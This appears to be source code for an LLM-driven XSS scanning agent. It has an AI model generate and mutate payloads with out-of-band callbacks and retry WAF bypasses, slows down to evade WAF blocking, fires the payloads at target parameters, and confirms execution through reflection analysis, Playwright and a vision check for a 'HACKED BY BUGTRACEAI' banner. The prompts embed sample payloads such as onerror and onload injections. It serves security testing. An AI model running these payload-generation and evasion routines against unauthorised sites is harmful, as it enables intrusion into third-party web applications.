            payloads = self._parse_smart_analysis_response(response, interactsh_url)

            if payloads:
                self._dom_log_generated_payloads(payloads)

            return payloads

        except Exception as e:
            logger.error(f"[{self.name}] LLM Smart Analysis failed: {e}", exc_info=True)
            return []

    def _extract_dom_around_reflection(self, html: str, probe: str, context_chars: int = 500) -> str:
        """Extract the DOM snippet around where the probe string appears."""
        if probe not in html:
            return html[:1000]  # Fallback to first 1000 chars

        idx = html.find(probe)
        start = max(0, idx - context_chars)
        end = min(len(html), idx + len(probe) + context_chars)

        snippet = html[start:end]

        # Try to include complete tags
        if start > 0:
            # Find the last < before our snippet
            last_open = html.rfind('<', 0, start)
            if last_open != -1 and last_open > start - 200:
                snippet = html[last_open:end]

        return snippet

    def _parse_smart_analysis_response(self, response: str, interactsh_url: str) -> List[Dict]:
        """Parse the LLM's smart analysis response into payload dicts."""
        import re

        # Try structured parsing first
        payloads = self._extract_structured_payloads(response, interactsh_url)

        # Fallback to pattern extraction if structured parsing failed
        if not payloads:
            payloads = self._extract_payloads_by_patterns(response)

        # Sort by confidence (highest first) and return top 3
        payloads.sort(key=lambda x: x.get("confidence", 0), reverse=True)
        return payloads[:3]

    def _extract_structured_payloads(self, response: str, interactsh_url: str) -> List[Dict]:
        """Extract payloads from structured XML-like tags."""
        import re
        payloads = []
        payload_pattern = r'<payload>(.*?)</payload>'
        matches = re.findall(payload_pattern, response, re.DOTALL)

        for match in matches:
            payload_dict = self._parse_payload_block(match, interactsh_url)
            if payload_dict:
                payloads.append(payload_dict)

        return payloads

    def _parse_payload_block(self, block: str, interactsh_url: str) -> Optional[Dict]:
        """Parse a single payload block with code, reasoning, impact, confidence."""
        import re

        code_match = re.search(r'<code>(.*?)</code>', block, re.DOTALL)
        if not code_match:
            return None

        code = self._clean_payload(code_match.group(1).strip(), "")
        code = self._replace_callback_urls(code, interactsh_url)

        reasoning_match = re.search(r'<reasoning>(.*?)</reasoning>', block, re.DOTALL)
        impact_match = re.search(r'<impact>(.*?)</impact>', block, re.DOTALL)
        confidence_match = re.search(r'<confidence>(.*?)</confidence>', block, re.DOTALL)

        return {
            "payload": code,
            "reasoning": reasoning_match.group(1).strip() if reasoning_match else "",
            "impact": impact_match.group(1).strip() if impact_match else "execution",
            "confidence": float(confidence_match.group(1).strip()) if confidence_match else 0.7
        }

    def _replace_callback_urls(self, code: str, interactsh_url: str) -> str:
        """Replace callback URL placeholders with actual interactsh URL."""
        import re
        if "{{interactsh_url}}" in code:
            return code.replace("{{interactsh_url}}", interactsh_url)
        elif "CALLBACK_URL" in code or "callback_url" in code.lower():
            return re.sub(r'(?i)callback_url', interactsh_url, code)
        return code

    def _extract_payloads_by_patterns(self, response: str) -> List[Dict]:
        """Extract payloads using regex patterns for common XSS indicators."""
        import re
        payloads = []
        code_patterns = [
            r'`([^`]+(?:alert|fetch|document\.|onerror|onload)[^`]+)`',
            r'Payload[:\s]+([^\n]+)',
        ]

        for pattern in code_patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            for m in matches[:3]:  # Limit to 3
                cleaned = self._clean_payload(m.strip(), "")
                if len(cleaned) > 5 and any(x in cleaned.lower() for x in ['<', 'alert', 'fetch', 'document']):
                    payloads.append({
                        "payload": cleaned,
                        "reasoning": "Extracted from LLM response",
                        "impact": "execution",
                        "confidence": 0.5
                    })

        return payloads

    def _analyze_build_system_prompt(self, interactsh_url: str, context_str: str) -> str:
        """Build system prompt for LLM XSS analysis."""
        master_prompt = """You are an elite XSS (Cross-Site Scripting) expert.
Analyze the provided HTML and the reflection context metadata.
Your goal is to generate a payload that will execute JavaScript.
The payload MUST include this callback URL for validation: {interactsh_url}

REFLECTION CONTEXT METADATA:
{context_data}

Rules:
1. If reflection is in 'html_text', use tags like <svg/onload=...> or <img src=x onerror=...>.
2. If reflection is in 'attribute_value', try to break out using "> or '>.
3. If reflection is in 'script' context, try to break out using '; or "; or use template literals.
4. ONLY generate a payload if the 'surviving_chars' allow for the necessary breakout.
5. If major characters like < or > are missing, try event handlers or javascript: pseudo-protocol if applicable.

Response Format (XML-Like):
<thought>Analysis of the context and why the chosen payload will work</thought>
<payload>The payload string</payload>
<validation_method>interactsh OR vision OR cdp</validation_method>
<context>Description of target context (e.g., inside href, between tags)</context>
<confidence>0.0 to 1.0</confidence>
"""

        if self.system_prompt:
            parts = self.system_prompt.split("# XSS Bypass Prompt")
            master_prompt = parts[0].replace("# Master XSS Analysis Prompt", "").strip()
            master_prompt += f"\n\nREFLECTION CONTEXT METADATA:\n{context_str}"

        return master_prompt.replace("{interactsh_url}", interactsh_url) \
                           .replace("{probe}", self.PROBE_STRING) \
                           .replace("{PROBE}", self.PROBE_STRING) \
                           .replace("{context_data}", context_str)

    def _analyze_parse_response(self, response: str, param: str) -> Optional[Dict]:
        """Parse LLM response and extract payload data."""
        # Robust XML Parsing
        from bugtrace.utils.parsers import XmlParser
        tags = ["payload", "validation_method", "context", "confidence"]
        data = XmlParser.extract_tags(response, tags)

        if data.get("payload"):
            cleaned_payload = self._clean_payload(data["payload"], param)
            return {
                "vulnerable": True,
                "payload": cleaned_payload,
                "validation_method": data.get("validation_method", "interactsh"),
                "context": data.get("context", "LLM Generated"),
                "confidence": float(data.get("confidence", 0.9))
            }

        # Fallback for non-XML compliant models
        if "alert(" in response or "fetch(" in response:
            logger.warning(f"[{self.name}] LLM failed XML tags but returned code. Attempting to extract payload manually.")
            lines = [l.strip() for l in response.strip().split("\n") if l.strip()]
            for line in reversed(lines):
                if "alert(" in line or "fetch(" in line:
                    cleaned = self._clean_payload(line, param)
                    return {
                        "vulnerable": True,
                        "payload": cleaned,
                        "validation_method": "interactsh",
                        "context": "Heuristic Extraction",
                        "confidence": 0.5
                    }
        return None

    async def _llm_analyze(self, html: str, param: str, interactsh_url: str, context_data: Dict = None) -> Optional[Dict]:
        """Ask LLM to analyze HTML and generate payload."""
        import json
        context_str = json.dumps(context_data or {}, indent=2)

        system_prompt = self._analyze_build_system_prompt(interactsh_url, context_str)

        user_prompt = f"""Target URL: {self.url}
Parameter: {param}
Probe: {self.PROBE_STRING}
Interactsh: {interactsh_url}

HTML Reflection Source (truncated):
```html
{html[:12000]}
```

Generate the OPTIMAL XSS payload based on the metadata and HTML.
"""

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="XSS_AGENT",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=8000  # Increased for reasoning models
            )

            logger.info(f"LLM Raw Response ({len(response)} chars)")
            return self._analyze_parse_response(response, param)

        except Exception as e:
            logger.error(f"LLM analysis failed: {e}", exc_info=True)
            return None
    
    async def _llm_generate_bypass(self, previous_payload: str, response_snippet: str, interactsh_url: str) -> Optional[Dict]:
        """Ask LLM to generate bypass payload."""
        bypass_prompt_template = """The previous payload did not trigger a callback.
Previous payload: {previous_payload}
HTTP Response: {response_snippet}
Analyze why it failed and generate a BYPASS payload with {interactsh_url}.

Response Format (XML-Like):
<thought>Analysis of failure</thought>
<bypass_payload>New payload to try</bypass_payload>
<confidence>0.1 to 1.0</confidence>
"""

        if self.system_prompt and "# XSS Bypass Prompt" in self.system_prompt:
             bypass_prompt_template = self.system_prompt.split("# XSS Bypass Prompt")[1].strip()

        prompt = bypass_prompt_template.replace("{previous_payload}", previous_payload) \
                                       .replace("{response_snippet}", response_snippet[:3000]) \
                                       .replace("{interactsh_url}", interactsh_url)
        
        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS_AGENT_BYPASS",
                system_prompt="You are a WAF bypass expert. Respond ONLY in XML tags: <bypass_payload>, <confidence>.",
                model_override=settings.MUTATION_MODEL,
            )
            
            from bugtrace.utils.parsers import XmlParser
            tags = ["bypass_payload", "confidence"]
            data = XmlParser.extract_tags(response, tags)
            
            if data.get("bypass_payload"):
                data["bypass_payload"] = self._clean_payload(data["bypass_payload"], "fake") # we clean but without specific param if unknown
                return data
            return None
            
        except Exception as e:
            logger.error(f"LLM bypass generation failed: {e}", exc_info=True)
            return None
    
    def _update_block_counter(self, status_code: int) -> None:
        """Update consecutive block counter based on response status."""
        if status_code == 200:
            if self.consecutive_blocks > 0:
                logger.info(f"[{self.name}] Target responded 200. Recovering...")
            self.consecutive_blocks = 0
            return

        if status_code in [403, 406, 501]:
            self.consecutive_blocks += 1
            logger.warning(f"[{self.name}] Potential WAF Block ({status_code}). Counter: {self.consecutive_blocks}")

    def _handle_send_error(self) -> None:
        """Handle network error and potentially trigger stealth mode."""
        self.consecutive_blocks += 1
        logger.warning(f"[{self.name}] Network Failure / WAF TCP Reset. Counter: {self.consecutive_blocks}")

        if self.consecutive_blocks >= 3 and not self.stealth_mode:
            self.stealth_mode = True
            dashboard.log(f"[{self.name}] 🛡️ WAF DETECTED! Entering Stealth Mode (Slown-down & Random Delay)", "WARN")
            logger.warning(f"[{self.name}] WAF confirmed via network resets. Enabling Stealth Mode.")

    async def _send_payload(self, param: str, payload: str) -> str:
        """Send XSS payload to target with WAF awareness. Supports GET and POST."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        method = getattr(self, '_current_http_method', 'GET')
        parsed = urlparse(self.url)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        try:
            async with http_manager.session(ConnectionProfile.PROBE) as session:
                if method == "POST":
                    # POST: payload in form body, keep original URL intact
                    base_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, parsed.query, parsed.fragment
                    ))
                    post_data = {param: payload}
                    async with session.post(base_url, data=post_data, headers=headers, ssl=False) as resp:
                        self._update_block_counter(resp.status)
                        text = await resp.text()
                        self._last_confirming_request = {"method": "POST", "url": base_url, "headers": dict(headers), "body": urlencode(post_data), "body_content_type": "application/x-www-form-urlencoded"}
                        self._last_response_content_type = resp.headers.get("Content-Type", "")
                        self._last_response_csp = resp.headers.get(
                            "Content-Security-Policy", "")
                        self._last_confirming_response = {"status": resp.status, "text": text}
                        return text
                else:
                    # GET: payload in query string (existing behavior)
                    params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
                    params[param] = payload
                    attack_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(params), parsed.fragment
                    ))
                    async with session.get(attack_url, headers=headers, ssl=False) as resp:
                        self._update_block_counter(resp.status)
                        text = await resp.text()
                        self._last_confirming_request = {"method": "GET", "url": attack_url, "headers": dict(headers), "body": None, "body_content_type": None}
                        self._last_response_content_type = resp.headers.get("Content-Type", "")
                        self._last_response_csp = resp.headers.get(
                            "Content-Security-Policy", "")
                        self._last_confirming_response = {"status": resp.status, "text": text}
                        return text
        except Exception:
            self._handle_send_error()
            # Never leave the PREVIOUS response's content type behind: an empty one means
            # "unknown", which the confirmation gate treats as executable (fail OPEN).
            self._last_response_content_type = ""
            self._last_response_csp = ""
            return ""

    async def _fast_reflection_check(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
        """
        Use Go fuzzer if available, otherwise fall back to Python.
        Returns list of reflection objects: [{"payload": "...", "encoded": False, "context": "..."}]
        """
        # Try Go fuzzer first
        go_result = await external_tools.run_go_xss_fuzzer(url, param, payloads)
        
        if go_result and go_result.get("reflections"):
            duration = go_result.get("metadata", {}).get("duration_ms", 0)
            logger.info(f"[{self.name}] Go fuzzer found {len(go_result['reflections'])} reflections in {duration}ms")
            return go_result["reflections"]
        
        # Fallback to Python (simulating reflection objects)
        reflected_payloads = await self._python_reflection_check(url, param, payloads)
        return [{"payload": p, "encoded": False, "context": "unknown"} for p in reflected_payloads]

    async def _python_reflection_check(self, url: str, param: str, payloads: List[str]) -> List[str]:
        """
        Fallback reflection check using Python aiohttp.
        """
        reflected = []
        for p in payloads:
            html = await self._send_payload(param, p)
            if p in html:
                reflected.append(p)
        return reflected
    
    async def _validate(
        self,
        param: str,
        payload: str,
        response_html: str,
        screenshots_dir: Path
    ) -> tuple:
        """
        4-LEVEL VALIDATION PIPELINE (V2.0)
        Ref: BugTraceAI-CLI/docs/architecture/xss-validation-pipeline.md

        Level Hierarchy:
        1. L1: HTTP Static Reflection Check (Fastest, ~70% coverage)
        2. L2: AI-Powered Manipulator/Auditor (Smart contextual analysis)
        3. L3: Playwright Browser Execution (DOM/Client-side execution)
        4. L4: CDP Deep Protocol (Delegated to AgenticValidator for race conditions)
        """
        evidence = {"payload": payload}

        # Level 1: HTTP Static Reflection Check
        if await self._validate_http_reflection(param, payload, response_html, evidence):
            return True, evidence

        # Level 2: AI-Powered Manipulator (Reflection Audit)
        if await self._validate_with_ai_manipulator(param, payload, response_html, evidence):
            return True, evidence

        # Level 3: Playwright Browser Execution
        if self._requires_browser_validation(payload, response_html):
            if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
                return True, evidence

        # Level 4: Escalation (Return False to let Manager/Reactor escalate to AgenticValidator)
        logger.debug(f"[{self.name}] L1-L3 inconclusive, escalation to L4 (AgenticValidator) required")
        return False, evidence

    async def _validate_http_reflection(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
        """Level 1: Fast HTTP static reflection and OOB check."""
        # Tier 1.1: OOB Interactsh (Definitive OOB)
        if await self._check_interactsh_hit(param, evidence):
            evidence["method"] = "L1: OOB Interactsh"
            evidence["level"] = 1
            return True

        # Ensure we have HTML for reflection check
        if not response_html:
            response_html = await self._send_payload(param, payload)
            if not response_html:
                return False

        # Tier 1.2: Accurate Context Analysis (checks for escaping)
        # Routed through the SAME gate every other level uses. Calling the individual
        # predicates here skipped the content-type suppression, so an API-backed form that
        # echoes the field into a JSON 422 body (DRF, Laravel, ProblemDetails) confirmed at
        # L1 even though L2/L3 would have rejected it — and L1 also never checked the JS
        # string breakout context, which is a straight recall gain.
        if self._can_confirm_from_http_response(payload, response_html, evidence):
            evidence["method"] = "L1: HTTP Static Reflection"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        # Note: Template expressions require browser evaluation, not confirmed here

        return False

    async def _validate_with_ai_manipulator(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
        """Level 2: AI-powered context audit and filter analysis."""
        if not response_html or re.escape(payload) not in response_html:
            return False

        dashboard.log(f"[{self.name}] 🤖 L2: AI Manipulator auditing reflection...", "INFO")
        ai_judgment = await self._analyze_reflection_via_ai(payload, response_html)
        
        if ai_judgment.get("vulnerable"):
            evidence["ai_confirmed"] = True
            evidence["ai_reasoning"] = ai_judgment.get("reasoning")
            evidence["execution_context"] = ai_judgment.get("context")
            evidence["method"] = "L2: AI Manipulator/Auditor"
            evidence["level"] = 2
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        return False

    async def _validate_with_playwright(self, param: str, payload: str, screenshots_dir: Path, evidence: Dict) -> bool:
        """Level 3: Playwright browser execution for DOM/Client behavior."""
        attack_url = self._build_attack_url(param, payload)
        
        # Use verify_xss with max_level=3 to only use Playwright in this agent
        result = await self.verifier.verify_xss(
            url=attack_url,
            screenshot_dir=str(screenshots_dir),
            timeout=8.0,
            max_level=3
        )

        if result.success:
            evidence.update(result.details or {})
            evidence["playwright_confirmed"] = True
            evidence["screenshot_path"] = result.screenshot_path
            evidence["method"] = "L3: Playwright Browser"
            evidence["level"] = 3
            evidence["status"] = "VALIDATED_CONFIRMED"

            # Step 3.1: Vision AI validation if screenshot available
            if result.screenshot_path:
                await self._run_vision_validation(result.screenshot_path, attack_url, payload, evidence)
            
            return True

        return False

    async def _check_interactsh_hit(self, param: str, evidence: Dict) -> bool:
        """Check for Interactsh OOB callback."""
        if not self.interactsh:
            return False

        await asyncio.sleep(1)
        label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
        hit_data = await self.interactsh.check_hit(label)

        if hit_data:
            evidence["interactsh_hit"] = True
            evidence["interactions"] = [hit_data]
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.interactsh.callback", {"param": param, "level": "oob_check"})
            dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED!", "CRITICAL")
            return True

        return False

    def _build_attack_url(self, param: str, payload: str) -> str:
        """Build attack URL with payload injected."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = payload

        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))



    async def _run_vision_validation(
        self, screenshot_path: str, attack_url: str, payload: str, evidence: Dict
    ) -> Optional[bool]:
        """
        Run Vision AI validation - simple SI/NO confirmation.

        Playwright already detected XSS via DOM/dialog. Vision provides
        VISUAL CONFIRMATION that the banner is visible = double evidence.
        """
        dashboard.log(f"[{self.name}] 📸 Calling Vision AI for visual confirmation...", "INFO")

        try:
            from bugtrace.core.llm_client import llm_client

            vision_prompt = self._build_vision_prompt()
            vision_response = await self._call_vision_with_retry(
                llm_client, screenshot_path, vision_prompt
            )

            return self._process_vision_result(vision_response, evidence)

        except Exception as e:
            logger.error(f"[{self.name}] Vision AI validation failed: {e}", exc_info=True)
            evidence["vision_error"] = str(e)
            # Playwright already confirmed, Vision is bonus - don't fail the finding
            return None

    def _build_vision_prompt(self) -> str:
        """
        Build simple SI/NO vision prompt.

        We only need to confirm the visual marker is visible.
        Playwright already validated execution context.
        """
        return """Look at this screenshot of a web page.

Question: Do you see a red banner or text that says "HACKED BY BUGTRACEAI" anywhere in the image?

Answer with ONLY one word: SI or NO"""

    async def _call_vision_with_retry(self, llm_client, screenshot_path: str, prompt: str) -> str:
        """Call vision API with retry logic using llm_client.generate_with_image()."""
        max_retries = 3

        for attempt in range(max_retries):
            try:
                result = await llm_client.generate_with_image(
                    prompt=prompt,
                    image_path=screenshot_path,
                    module_name="XSS-Vision",
                    temperature=0.1  # Low temperature for deterministic SI/NO
                )
                return result or ""
            except Exception as retry_error:
                if attempt == max_retries - 1:
                    raise
                logger.warning(f"Vision validation attempt {attempt + 1}/{max_retries} failed: {retry_error}")
                await asyncio.sleep(2 ** attempt)  # Exponential backoff

        raise Exception("Vision validation failed after all retries")

    def _process_vision_result(self, vision_response: str, evidence: Dict) -> Optional[bool]:
        """
        Process vision AI response - simple SI/NO parsing.

        Returns:
            True: Vision confirmed banner visible
            False: Vision says NO banner
            None: Inconclusive response
        """
        if not vision_response:
            evidence["vision_confirmed"] = False
            evidence["vision_reason"] = "Empty response"
            return None

        response_upper = vision_response.strip().upper()

        # Check for SI/YES confirmation
        if response_upper in ["SI", "SÍ", "YES", "S", "Y"]:
            evidence["vision_confirmed"] = True
            evidence["vision_response"] = vision_response
            evidence["validation_method"] = "playwright+vision"

            dashboard.log(
                f"[{self.name}] ✅ VISION CONFIRMED: Banner 'HACKED BY BUGTRACEAI' visible",
                "SUCCESS"
            )
            return True

        # Check for NO confirmation
        if response_upper in ["NO", "N"]:
            evidence["vision_confirmed"] = False
            evidence["vision_response"] = vision_response
            evidence["vision_reason"] = "Banner not visible in screenshot"

            dashboard.log(
                f"[{self.name}] ⚠️ Vision: Banner NOT visible (Playwright still confirmed)",
                "WARNING"
            )
            # Return None, not False - Playwright already confirmed, don't reject
            return None

        # Inconclusive - unexpected response
        evidence["vision_confirmed"] = False
        evidence["vision_response"] = vision_response
        evidence["vision_reason"] = f"Unexpected response: {vision_response[:50]}"

        dashboard.log(
            f"[{self.name}] ⚠️ Vision inconclusive: {vision_response[:30]}...",
            "WARNING"
        )
        return None

    def _check_reflection(self, payload: str, response_html: str, evidence: Dict) -> bool:
        """Check if payload is reflected in response."""
        import urllib.parse
        import html

        # Test multiple decoding levels
        p_decoded = urllib.parse.unquote(payload)
        p_double_decoded = urllib.parse.unquote(p_decoded)
        p_html_decoded = html.unescape(p_decoded)

        reflections = [payload, p_decoded, p_double_decoded, p_html_decoded]

        # Check if any variant is reflected
        for ref in set(reflections):
            if ref and ref in response_html:
                evidence["reflected"] = True
                evidence["status"] = "VALIDATED_CONFIRMED"  # v3.2.1: CDP disabled
                dashboard.log(
                    f"[{self.name}] 🔍 Reflection detected (possibly decoded).",
                    "INFO"
                )
                return True

        return False

    def _can_confirm_from_http_response(
        self, payload: str, response_html: str, evidence: dict
    ) -> bool:
        """
        Confirm XSS from HTTP response without browser.

        STRICT validation: Only confirms when payload lands in a truly
        executable context WITHOUT being neutered (escaped/encoded).

        Key insight:
        - In HTML: <, >, " must NOT be HTML-encoded (&lt; &gt; &quot;)
        - In JS strings: quotes must NOT be backslash-escaped (\\" or \\')
        - Payload inside a JS string literal does NOT execute

        Args:
            payload: The XSS payload that was sent
            response_html: The HTML response to analyze
            evidence: Dict to populate with validation details

        Returns:
            True if XSS can be confirmed from HTTP response, False otherwise
        """
        # Reflected HTML/JS only executes when the browser PARSES the response as a
        # document. An ALLOWLIST, not the old 3-item denylist: json / text/plain /
        # octet-stream left application/javascript, application/rss+xml, atom+xml,
        # application/xml and text/xml executable, and "/?s=<payload>&feed=rss2" exists on
        # every WordPress site. An absent/empty content type still passes — fail OPEN.
        _ct = (getattr(self, "_last_response_content_type", "") or "").split(";")[0].strip().lower()
        if _ct and _ct not in _EXECUTABLE_CONTENT_TYPES:
            evidence["fp_suppressed"] = f"non-executable content-type: {_ct}"
            return False
        # The XML content types are parsed by an XML parser, where `<x/>` really does close
        # the element. In text/html that same solidus is ignored, so the two disagree about
        # everything that follows an XHTML-style `<script src=a/>`.
        self._response_is_xml = _ct in _XML_CONTENT_TYPES
        # Determine the executable context (if any), then stamp the confirming request ONCE.
        ctx = None
        if self._is_executable_in_html_context(payload, response_html):
            ctx = "html_tag"
        elif self._is_executable_in_event_handler(payload, response_html):
            ctx = "event_handler"
        elif self._is_executable_in_javascript_uri(payload, response_html):
            ctx = "javascript_uri"
        elif self._is_executable_in_template(payload, response_html):
            ctx = "template_expression"
        elif self._is_executable_in_js_string_breakout(payload, response_html):
            # payload \';alert()// → server returns \\';alert()// inside <script> → code executes
            ctx = "js_string_breakout"

        # CSP is consulted LAST, and only once something would otherwise be confirmed.
        # Every payload this agent sends is inline script, so a policy that forbids inline
        # script makes the reflection unexploitable by anything we can send — Chromium
        # refuses to run it and prints "Refused to execute inline event handler". Both
        # carriers are consulted: the enforcing response header and the document's own
        # <meta http-equiv>. Asking here rather than up front keeps the cost off the
        # dominant path: on a payload sweep almost every probe reflects nowhere at all,
        # and those must not pay for a policy scan whose answer nobody would read.
        if ctx:
            try:
                if (_csp_blocks_inline(getattr(self, "_last_response_csp", "") or "")
                        or _csp_blocks_inline(_document_csp(response_html))):
                    evidence["fp_suppressed"] = "CSP forbids inline script"
                    evidence["http_confirmed"] = False
                    return False
            except Exception as e:  # unknown policy → fail OPEN
                logger.debug(f"[{self.name}] CSP analysis failed, assuming executable: {e}")

        if ctx:
            evidence["http_confirmed"] = True
            evidence["execution_context"] = ctx
            evidence["validation_method"] = "http_response_analysis"
            self._stamp_repro(evidence, payload, response_html)
            return True

        # No executable context found
        evidence["http_confirmed"] = False
        return False

    def _stamp_repro(self, evidence: dict, payload: str, response_html: str) -> None:
        """Seed enrichment: persist the EXACT request (auth masked) that confirmed this
        finding, so the WEB AI Repeater can replay it instead of guessing GET-with-query."""
        req = getattr(self, "_last_confirming_request", None)
        if req:
            evidence["confirming_request"] = {
                "method": req.get("method", "GET"),
                "url": req.get("url", self.url),
                "headers": _mask_auth_headers(req.get("headers") or {}),
                "body": req.get("body"),
                "body_content_type": req.get("body_content_type"),
            }
            evidence["capture_method"] = "http_response_analysis"
        resp = getattr(self, "_last_confirming_response", None)
        if resp is not None:
            evidence["confirming_response"] = {
                "status": resp.get("status"),
                "excerpt": _excerpt_around(response_html or resp.get("text", "") or "", payload),
            }

    def _is_executable_in_html_context(self, payload: str, response_html: str) -> bool:
        """
        Check if the payload lands somewhere the browser will parse it as markup.

        Returns True if ANY occurrence of the payload sits in an executable position, and
        False only when EVERY occurrence is PROVABLY inert per the HTML tokenizer:
        - inside an RCDATA/RAWTEXT element (title, textarea, script, style, ...) without
          the matching close tag in the payload,
        - inside a quoted attribute value whose delimiter the payload cannot escape,
        - inside an HTML comment the payload cannot close,
        - HTML-entity-escaped (&lt;/&quot;/&#60;) or percent-encoded inside a URL
          attribute — those leave no raw occurrence at all.

        Evaluating ALL occurrences is strictly BETTER for recall than the previous
        first-occurrence-only check: a payload echoed into <title> AND into the page body
        used to be judged on the <title> copy alone and silently rejected. It is also
        better for precision: a reflection that only ever lands in <title> or in
        <meta content="..."> no longer stamps http_confirmed.

        The old implementation stripped <script> blocks before matching; that behaviour is
        kept deliberately (script/style are part of the RCDATA/RAWTEXT set) but a payload
        carrying its own </script> now correctly confirms as a breakout.

        Fails OPEN: a parser error or an unrecognised position counts as executable — a
        false positive is recoverable, a silently dropped vulnerability is not.
        """
        try:
            occurrences = _reflection_occurrences(
                response_html, payload, bool(getattr(self, "_response_is_xml", False)))
        except Exception as e:
            logger.debug(f"[{self.name}] Reflection classification failed, assuming executable: {e}")
            return True
        positions = [p for p, _t, _c, _h in occurrences]

        if any(_position_executes(p, payload, tag, tail, host)
               for p, tag, tail, host in occurrences):
            return True

        # An <iframe srcdoc="..."> value is ENTITY-DECODED and then parsed as a whole HTML
        # document, so an entity-escaped payload leaves no raw occurrence anywhere in the
        # response and still executes. Nothing else can be rescued here: everywhere else
        # entity encoding really is inertness.
        try:
            if "srcdoc" in _attribute_injection_contexts(response_html, payload):
                return True
        except Exception as e:  # unknown state → fail OPEN
            logger.debug(f"[{self.name}] srcdoc analysis failed, assuming executable: {e}")
            return True

        if positions:
            logger.debug(
                f"[{self.name}] Reflection is inert in every position ({', '.join(sorted(set(positions)))}) "
                f"- not confirming from HTTP: {payload[:60]}"
            )
        return False

    def _is_executable_in_event_handler(self, payload: str, response_html: str) -> bool:
        """
        Check if payload can execute via an event handler attribute (onclick="...").

        The old `on\\w+\\s*=\\s*(["'])([^"']*?)PAYLOAD` regex could only ever match the
        degenerate `onclick="PAYLOAD"` shape: `[^"']*?` cannot cross the JS string's own
        opening quote, so `onclick="filter('PAYLOAD')"` — the standard admin-panel /
        ASP.NET / JSF shape — never matched at all. The attribute is now located with the
        HTML tokenizer and judged with the JS lexer.
        """
        try:
            return "event_handler" in _attribute_injection_contexts(response_html, payload)
        except Exception as e:  # unknown state → fail OPEN
            logger.debug(f"[{self.name}] Event-handler analysis failed, assuming executable: {e}")
            return True

    def _is_executable_in_javascript_uri(self, payload: str, response_html: str) -> bool:
        """
        Check if payload can execute via a javascript: URI (href="javascript:...").

        Same fix as the event handler above: `javascript:[^"']*PAYLOAD` could not reach a
        payload nested inside the URI's own JS string, and it only looked at href/src/action
        instead of the whole URL-bearing attribute set.
        """
        try:
            return "javascript_uri" in _attribute_injection_contexts(response_html, payload)
        except Exception as e:  # unknown state → fail OPEN
            logger.debug(f"[{self.name}] javascript: URI analysis failed, assuming executable: {e}")
            return True

    def _is_executable_in_template(self, payload: str, response_html: str) -> bool:
        """
        Check if payload appears in template expression.

        {{payload}} or ${payload} in Angular/Vue/etc could execute.
        BUT: This requires browser to evaluate, so return False here
        and let browser validation handle it.
        """
        # Template expressions need client-side evaluation
        # We can't confirm execution from HTTP alone
        return False

    def _is_executable_in_js_string_breakout(self, payload: str, response_html: str) -> bool:
        """
        Check if the payload breaks out of a JS string inside an inline <script>.

        Handles the reflection shapes the payload does NOT survive verbatim — chiefly the
        server that escapes backslashes, so `\\';alert(1)//` comes back as `\\\\';alert(1)//`.
        (The verbatim shapes are already covered by the position classifier, which routes
        <script> content through the SAME lexer.)

        The old implementation counted backslashes before every quote and guessed the
        enclosing string delimiter with a 300-char backward regex. The lexer replaces both:
        the backslash parity IS the escape handling in _js_scan_quoted, and the delimiter
        is a fact of the token, not a guess. The two behaviours that must survive:
          * `x\\\\';alert(1)//` — doubled backslash then a FREE quote → BREAKOUT
          * `x\\\\\\';alert(1)//` — the quote itself got escaped → NOT a breakout
        """
        try:
            forms = _reflected_forms(payload)
            for body, _ in _inline_script_bodies(response_html):
                for form in forms:
                    at = body.find(form)
                    while at != -1:
                        end = at + len(form)
                        if (_js_span_escapes(body, at, end)
                                and _js_breakout_parses(body, at, end)):
                            logger.info(
                                f"[{self.name}] JS string breakout confirmed: reflected as "
                                f"'{form[:40]}' in code position"
                            )
                            return True
                        at = body.find(form, at + 1)
        except Exception as e:  # unknown state → fail OPEN
            logger.debug(f"[{self.name}] JS breakout analysis failed, assuming executable: {e}")
            return True
        return False

    def _payload_reflects(self, payload: str, response: str) -> bool:
        """
        Check if payload reflects in the response, accounting for server transformations.

        Handles:
        1. Exact match (original behavior)
        2. Backslash doubling: server escapes \\ to \\\\ (e.g. \\' → \\\\')
        3. Executable part match: for breakout payloads, check if the code after
           the breakout sequence appears in the response
        """
        # 1. Exact match (original)
        if payload in response:
            return True

        # 2. Server transforms \ to \\ (common escaping)
        if '\\' in payload:
            transformed = payload.replace('\\', '\\\\')
            if transformed in response:
                return True

        # 3. Executable part match for breakout payloads
        for breakout in ["\\'", '\\"', "';", '";']:
            if breakout in payload:
                exec_part = payload.split(breakout, 1)[1]
                if exec_part and len(exec_part) > 5 and exec_part in response:
                    return True

        return False

    def _detect_execution_context(self, payload: str, response_html: str) -> Optional[str]:
        """
        Detect the execution context where payload landed.

        Returns context type for high-confidence execution, or None.
        Priority order: script_block > event_handler > javascript_uri > template_expression
        """
        escaped = re.escape(payload)

        # 1. Script block - highest priority (direct execution in <script> tags)
        if re.search(rf'<script[^>]*>.*?{escaped}.*?</script>', response_html, re.DOTALL | re.IGNORECASE):
            return "script_block"

        # 2. Event handler attributes (onclick, onerror, onload, etc.)
